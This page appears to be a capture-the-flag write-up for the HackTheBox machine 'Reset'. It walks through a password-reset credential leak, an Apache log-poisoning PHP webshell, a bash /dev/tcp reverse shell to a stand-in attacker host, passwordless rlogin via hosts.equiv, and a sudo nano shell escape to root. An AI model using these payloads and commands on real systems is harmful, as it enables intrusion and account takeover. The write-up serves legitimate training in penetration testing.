@@ -1,0 +1,427 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>HTB: Reset — Password Reset Disclosure to Log Poisoning RCE</title>
+<style>
+  * { box-sizing: border-box; }
+  html { background-color: #0a0e27; }
+  body {
+    background-color: rgba(10, 14, 39, 0.9);
+    color: #e0e0e0;
+    font-family: 'Courier New', monospace;
+    max-width: 900px;
+    margin: 0 auto;
+    padding: 40px 20px;
+    line-height: 1.6;
+  }
+  /* Animated grid background */
+  .bg-animation {
+    position: fixed;
+    top: 0;
+    left: 0;
+    width: 100%;
+    height: 100%;
+    z-index: -1;
+    opacity: 0.08;
+    background:
+      linear-gradient(90deg, transparent 98%, #00ff88 100%),
+      linear-gradient(0deg, transparent 98%, #00ff88 100%);
+    background-size: 50px 50px;
+    animation: grid-flow 20s linear infinite;
+  }
+  @keyframes grid-flow {
+    0% { transform: translateY(0); }
+    100% { transform: translateY(50px); }
+  }
+  a { color: #66d9ef; text-decoration: none; }
+  a:hover { color: #00ff88; text-decoration: underline; }
+  h1 {
+    color: #00ff88;
+    text-shadow: 0 0 8px rgba(0,255,136,0.5);
+    font-size: 2.2em;
+    margin-bottom: 10px;
+  }
+  h2 {
+    color: #00ff88;
+    border-bottom: 1px solid #1a1f3a;
+    padding-bottom: 8px;
+    margin-top: 50px;
+    text-transform: uppercase;
+    letter-spacing: 1px;
+  }
+  h3 { color: #66d9ef; margin-top: 30px; }
+  .tags { margin: 15px 0 5px 0; }
+  .tag {
+    display: inline-block;
+    background: rgba(0,255,136,0.1);
+    border: 1px solid rgba(0,255,136,0.3);
+    color: #00ff88;
+    padding: 4px 12px;
+    margin-right: 8px;
+    font-size: 0.85em;
+    border-radius: 4px;
+  }
+  .tag.easy {
+    background: rgba(102,217,239,0.2);
+    color: #66d9ef;
+    border-color: #66d9ef;
+  }
+  .meta { color: #888; font-size: 0.9em; margin-bottom: 30px; }
+  .meta b { color: #a0a0a0; }
+  code, pre {
+    background-color: #10152e;
+    border: 1px solid #232a4d;
+    border-radius: 4px;
+  }
+  code { padding: 2px 6px; font-size: 0.95em; color: #66d9ef; }
+  pre {
+    padding: 16px;
+    overflow-x: auto;
+    margin: 16px 0;
+    color: #b8e6c8;
+    border-left: 3px solid #00ff88;
+  }
+  pre code { border: none; padding: 0; color: inherit; background: none; }
+  .callout {
+    background: rgba(102,217,239,0.06);
+    border-left: 3px solid #66d9ef;
+    padding: 12px 18px;
+    margin: 20px 0;
+    color: #b0c4cc;
+  }
+  .callout.warn {
+    background: rgba(255,208,0,0.06);
+    border-left: 3px solid #ffd000;
+    color: #d8cfa0;
+  }
+  .divider {
+    border: none;
+    height: 1px;
+    background: linear-gradient(90deg, transparent, #00ff88, transparent);
+    margin: 40px 0;
+  }
+  ul, ol { padding-left: 22px; }
+  li { margin-bottom: 6px; }
+  .back { display: inline-block; margin-bottom: 30px; color: #66d9ef; }
+  .flag-redacted {
+    color: #888;
+    font-style: italic;
+  }
+  table {
+    width: 100%;
+    border-collapse: collapse;
+    margin: 16px 0;
+  }
+  th, td {
+    border: 1px solid #232a4d;
+    padding: 8px 12px;
+    text-align: left;
+  }
+  th {
+    color: #00ff88;
+    background: rgba(0,255,136,0.05);
+    text-transform: uppercase;
+    letter-spacing: 1px;
+  }
+</style>
+</head>
+<body>
+
+<div class="bg-animation"></div>
+
+<a class="back" href="index.html#writeups">&larr; Back to all writeups</a>
+
+<h1>HTB: Reset — Password Reset Disclosure to Log Poisoning RCE</h1>
+
+<div class="tags">
+  <span class="tag">HACKTHEBOX</span>
+  <span class="tag easy">EASY</span>
+  <span class="tag">LINUX</span>
+  <span class="tag">LOG POISONING</span>
+  <span class="tag">RSERVICES</span>
+  <span class="tag">GTFOBINS</span>
+</div>
+
+<div class="meta">
+  Author: th3_m4d_h4ck3r &nbsp;|&nbsp; Framework: Scarif Operations &nbsp;|&nbsp; Season 11
+</div>
+
+<h2>&gt; OVERVIEW</h2>
+
+<p>Reset is an Easy-rated Linux box built around a genuinely broken password
+reset endpoint, a log-poisoning-to-RCE chain, and a deep cut into legacy
+Rservices trust relationships for privesc. Every individual vulnerability
+here is well documented and, on paper, simple. In practice, the log
+poisoning step turned into the longest debugging session of the season —
+not because the vulnerability was hard to find, but because getting a
+<em>reliable</em> reverse shell out of it required untangling three separate,
+compounding failure modes at once. That debugging process is worth
+documenting in as much detail as the exploit itself.</p>
+
+<h2>&gt; RECON</h2>
+
+<pre>sudo nmap -sV -sC -p- --min-rate 5000 &lt;target&gt;</pre>
+
+<table>
+  <tr><th>Port</th><th>Service</th></tr>
+  <tr><td>22</td><td>OpenSSH</td></tr>
+  <tr><td>80</td><td>Apache — "Admin Login" page</td></tr>
+  <tr><td>512</td><td>netkit-rsh rexecd</td></tr>
+  <tr><td>513</td><td>rlogin</td></tr>
+  <tr><td>514</td><td>Netkit rshd</td></tr>
+</table>
+
+<p>Ports 512&ndash;514 are the classic Rservices trio — a strong signal for
+later, legacy trust-based lateral movement.</p>
+
+<h2>&gt; PASSWORD RESET — CREDENTIALS HANDED BACK IN THE RESPONSE</h2>
+
+<p>The site's "Forgot Password?" flow posts a username to
+<code>reset_password.php</code>. The endpoint doesn't require knowing anything
+about the account first — and its JSON response contains the freshly
+generated password in plain text:</p>
+
+<pre>curl -s -X POST http://&lt;target&gt;/reset_password.php -d "username=admin"
+# {"username":"admin","new_password":"0af20d2b","timestamp":"..."}</pre>
+
+<p>That's immediate, unauthenticated account takeover for any known or
+guessable username. Logging in as <code>admin</code> with the returned password
+grants access to <code>dashboard.php</code> — an internal log viewer with a
+dropdown for <code>syslog</code> and <code>auth.log</code>.</p>
+
+<h2>&gt; THE LFI — AND WHY EARLY TESTS ALL CAME BACK BLANK</h2>
+
+<p>The log viewer passes the selected path directly to the backend via a
+<code>file</code> POST parameter, with only a loose <code>/var/log/</code> prefix check —
+no whitelist enforcement beyond that. Pointing it at
+<code>/var/log/apache2/access.log</code> should be a textbook log-poisoning setup:
+Apache logs the request <code>User-Agent</code> verbatim, so a PHP payload placed
+there gets written to a file the app is willing to <code>include</code>.</p>
+
+<div class="callout warn">
+Every initial test against <code>/var/log/syslog</code>, <code>/var/log/auth.log</code>, and
+even <code>/etc/passwd</code> came back completely blank or "Invalid file path,"
+with no obvious pattern. The instinct here was to suspect log rotation, a
+race condition, session expiry, or file permissions — and each of those
+turned out to be a real, if minor, factor at different points. The actual
+root cause of most of the "blank" results, though, was much dumber: a
+<code>grep -oP</code> extraction pattern using <code>.*?</code> to pull content out of the
+response, which does not match across newlines by default. Since the log
+content spans many lines, the regex silently matched nothing — even
+when the underlying request and response were both completely fine.
+</div>
+
+<p>Confirming the LFI actually worked meant abandoning fragile one-line
+extraction patterns in favor of dumping full raw responses and eyeballing
+them directly:</p>
+
+<pre>curl -s "http://&lt;target&gt;/THISISAUNIQUEMARKER12345"
+curl -s -b cookies.txt -X POST http://&lt;target&gt;/dashboard.php \
+  -d "file=/var/log/apache2/access.log" | grep -A5 "Log Contents"</pre>
+
+<p>Once verified with a controlled, uniquely identifiable marker string, the
+LFI was confirmed solid and had never actually been broken.</p>
+
+<h2>&gt; POISONING — TWO MORE LAYERS OF FAILURE BEFORE A CLEAN SHELL</h2>
+
+<p>With the LFI confirmed, the next step — planting
+<code>&lt;?php system($_GET['cmd']); ?&gt;</code> via <code>User-Agent</code> and triggering it with
+a matching query parameter — produced a working <code>phpinfo()</code> execution,
+proving code execution worked. Getting an actual reverse shell out of it
+surfaced two more distinct problems.</p>
+
+<h3>Problem 1: the log never rotates</h3>
+
+<p>Every poisoned line ever sent stays in the file indefinitely. Since the
+viewer <code>include</code>s the whole log top-to-bottom, an <em>earlier</em> test
+payload using <code>$_GET['cmd']</code> would still execute first on every later
+request. If that request didn't happen to also supply a <code>cmd</code>
+parameter, PHP 8's strict typing threw a fatal <code>TypeError</code> passing
+<code>null</code> into <code>system()</code>, halting the entire script before it ever
+reached a newer payload further down the file.</p>
+
+<div class="callout">
+Fix: keep supplying every parameter name any earlier test payload
+depended on, on every subsequent request, so old broken lines have a
+harmless value to consume instead of crashing. Cleaner still: write new
+payloads with no external dependency on <code>$_GET</code> at all once the
+hardcoded final command is known.
+</div>
+
+<h3>Problem 2: <code>system()</code> invokes <code>/bin/sh</code>, not <code>bash</code></h3>
+
+<p>Once a payload was self-contained, the classic reverse shell one-liner
+still silently failed:</p>
+
+<pre>bash -i &gt;&amp; /dev/tcp/&lt;attacker&gt;/4444 0&gt;&amp;1</pre>
+
+<div class="callout warn">
+PHP's <code>system()</code> executes commands via <code>/bin/sh</code>, which on Ubuntu is
+<code>dash</code>, not <code>bash</code>. <code>dash</code> does not support the <code>&gt;&amp;</code> redirection
+shorthand bash uses for combining stdout/stderr into a socket — it's a
+bash-specific extension. The command was silently failing at the shell
+level, with no error surfaced anywhere, because it never even reached a
+shell that understood the syntax.
+</div>
+
+<p>The fix avoids the bash-vs-dash mismatch entirely by base64-encoding the
+real payload and explicitly piping it into <code>bash</code>, keeping the outer
+command POSIX-compatible (plain piping works fine under <code>dash</code>):</p>
+
+<pre># Encode the real payload
+echo -n 'bash -i &gt;&amp; /dev/tcp/&lt;attacker&gt;/4444 0&gt;&amp;1' | base64 -w0
+
+# Poison with the encoded, self-contained payload
+curl -s http://&lt;target&gt;/ \
+  -A "&lt;?php system('echo &lt;BASE64&gt;|base64 -d|bash'); ?&gt;" -o /dev/null
+
+# Trigger (with any legacy $_GET names still needed to survive older lines)
+curl -s -b cookies.txt -X POST "http://&lt;target&gt;/dashboard.php?cmd=id&amp;trigger=id" \
+  -d "file=/var/log/apache2/access.log" -o /dev/null &amp;</pre>
+
+<p>That landed a clean shell as <code>www-data</code>.</p>
+
+<h2>&gt; PRIVESC — RSERVICES TRUST ABUSE</h2>
+
+<p><code>/etc/hosts.equiv</code> confirmed the setup hinted at by the open Rservices
+ports:</p>
+
+<pre>- root
+- local
++ sadm</pre>
+
+<p>The bare <code>+ sadm</code> entry means <em>any</em> remote host is trusted to log in as
+<code>sadm</code> via <code>rlogin</code> with <strong>no password at all</strong> — rsh/rlogin's
+antiquated trust model authenticates based on the connecting username and
+hostname/IP matching an allow-list, not a credential. The only trick is
+that the client also needs a local account literally named <code>sadm</code>, since
+the trust decision is keyed off the connecting username:</p>
+
+<pre># on the attacker box
+sudo useradd sadm
+sudo passwd sadm
+su sadm
+rlogin &lt;target&gt;</pre>
+
+<p>That dropped straight into an interactive session as <code>sadm</code> on the
+target, zero credentials required.</p>
+
+<h2>&gt; ROOT — A LIVE TMUX SESSION AND SUDO NANO</h2>
+
+<p><code>sadm</code> had an existing detached tmux session:</p>
+
+<pre>find / -user sadm 2&gt;/dev/null | grep tmux
+tmux ls
+tmux attach -t sadm_session</pre>
+
+<p>The pane showed a half-completed command — <code>sadm</code> piping a password
+into a <code>sudo</code> prompt that had already failed once:</p>
+
+<pre>echo &lt;PASSWORD&gt; | sudo -S nano /etc/firewall.sh
+Too many errors from stdin</pre>
+
+<p>That leaked password worked cleanly for a real <code>sudo -l</code>:</p>
+
+<pre>User sadm may run the following commands on reset:
+    (ALL) PASSWD: /usr/bin/nano /etc/firewall.sh
+    (ALL) PASSWD: /usr/bin/tail /var/log/syslog
+    (ALL) PASSWD: /usr/bin/tail /var/log/auth.log</pre>
+
+<p><code>nano</code> with sudo rights is a documented GTFOBins escape:</p>
+
+<pre>sudo /usr/bin/nano /etc/firewall.sh
+# Ctrl+R, Ctrl+X, then type:
+reset; sh 1&gt;&amp;0 2&gt;&amp;0</pre>
+
+<pre>root@reset:~# cat /root/root.txt
+<span class="flag-redacted">[root flag captured ✅]</span></pre>
+
+<h2>&gt; ATTACK CHAIN SUMMARY</h2>
+
+<ol>
+  <li>Password reset endpoint returns the newly generated password directly in its JSON response — no verification of requester identity required</li>
+  <li>Admin login grants access to a log-viewer dashboard passing an attacker-controlled file path with only a loose prefix check</li>
+  <li>Apache's own access log is poisoned with a PHP payload via the <code>User-Agent</code> header</li>
+  <li>The log-inclusion LFI executes the planted payload, achieving RCE as <code>www-data</code> — after working through log accumulation, a PHP null-argument fatal error, and a <code>dash</code>-vs-<code>bash</code> redirection incompatibility</li>
+  <li><code>/etc/hosts.equiv</code> trusts any host connecting as user <code>sadm</code> via legacy rsh/rlogin services, requiring only a matching local username on the attacking machine — no credentials</li>
+  <li>A live, detached tmux session belonging to <code>sadm</code> leaks a sudo password mid-command</li>
+  <li>Sudo rights over <code>nano</code> are abused via a documented GTFOBins shell-escape technique for full root</li>
+</ol>
+
+<h2>&gt; LESSONS LEARNED</h2>
+
+<ul>
+  <li>Before concluding an LFI or file-read primitive is broken, verify the extraction/parsing tooling on your own end first — a regex that doesn't handle multiline content can produce a false negative that looks exactly like a genuine server-side failure.</li>
+  <li>Log-poisoning targets that never rotate accumulate every prior test payload forever. Any earlier attempt that depends on an external parameter being present will keep firing (and potentially crashing) on every future request until either the log is cleared or every dependency is satisfied on every subsequent call.</li>
+  <li><code>system()</code>, <code>exec()</code>, and friends in PHP invoke the configured shell (typically <code>/bin/sh</code>, i.e. <code>dash</code> on Debian/Ubuntu) — not necessarily <code>bash</code>. Bash-specific syntax like <code>&gt;&amp;</code> redirection shorthand will silently fail under a POSIX-only shell with no visible error. Base64-encoding a payload and piping it explicitly into <code>bash</code> sidesteps the entire class of problem.</li>
+  <li>Legacy Rservices (<code>rsh</code>/<code>rlogin</code>/<code>rexec</code>) authenticate by trusting the claimed username and source host/IP rather than a credential — a fundamentally broken model by modern standards, but still occasionally found propping up "trusted internal" workflows. A bare <code>hosts.equiv</code> entry is effectively a standing invitation.</li>
+  <li>Live tmux sessions belonging to other users are a goldmine during privesc enumeration — always check for detached sessions before assuming a dead end.</li>
+</ul>
+
+<hr class="divider">
+
+<p style="color:#6a7a85; font-size:0.85em;">
+Scarif Operations &nbsp;|&nbsp; th3m4dh4ck3r.com &nbsp;|&nbsp; CPTS prep, Season 11
+</p>
+
+    <!-- Matrix Rain Effect — full-page backdrop behind all content -->
+    <canvas id="matrix-rain"></canvas>
+    <script>
+        // Full-width Matrix rain rendered as a fixed backdrop across the whole
+        // page. z-index:-1 + pointer-events:none keep it strictly BEHIND the
+        // content so it never runs over text, tags, code blocks or images.
+        (function () {
+            const canvas = document.getElementById('matrix-rain');
+            const ctx = canvas.getContext('2d');
+
+            canvas.style.position = 'fixed';
+            canvas.style.top = '0';
+            canvas.style.left = '0';
+            canvas.style.zIndex = '-1';
+            canvas.style.pointerEvents = 'none';
+            canvas.style.opacity = '0.4';
+
+            const matrixChars = 'ｱｲｳｴｵｶｷｸｹｺｻｼｽｾｿﾀﾁﾂﾃﾄﾅﾆﾇﾈﾉﾊﾋﾌﾍﾎﾏﾐﾑﾒﾓﾔﾕﾖﾗﾘﾙﾚﾛﾜﾝ01234567890@#$%^&*()';
+            const fontSize = 16;
+            let drops = [];
+
+            function initColumns() {
+                const columns = Math.floor(canvas.width / fontSize);
+                drops = [];
+                for (let i = 0; i < columns; i++) {
+                    drops[i] = Math.random() * -100;
+                }
+            }
+
+            function resize() {
+                canvas.width = window.innerWidth;
+                canvas.height = window.innerHeight;
+                initColumns();
+            }
+
+            function draw() {
+                ctx.fillStyle = 'rgba(10, 14, 39, 0.05)';
+                ctx.fillRect(0, 0, canvas.width, canvas.height);
+
+                ctx.fillStyle = '#00ff88';
+                ctx.font = fontSize + 'px monospace';
+
+                for (let i = 0; i < drops.length; i++) {
+                    const char = matrixChars[Math.floor(Math.random() * matrixChars.length)];
+                    ctx.fillText(char, i * fontSize, drops[i] * fontSize);
+                    if (drops[i] * fontSize > canvas.height && Math.random() > 0.975) {
+                        drops[i] = 0;
+                    }
+                    drops[i]++;
+                }
+            }
+
+            resize();
+            setInterval(draw, 50);
+            window.addEventListener('resize', resize);
+        })();
+    </script>
+
+</body>
+</html>
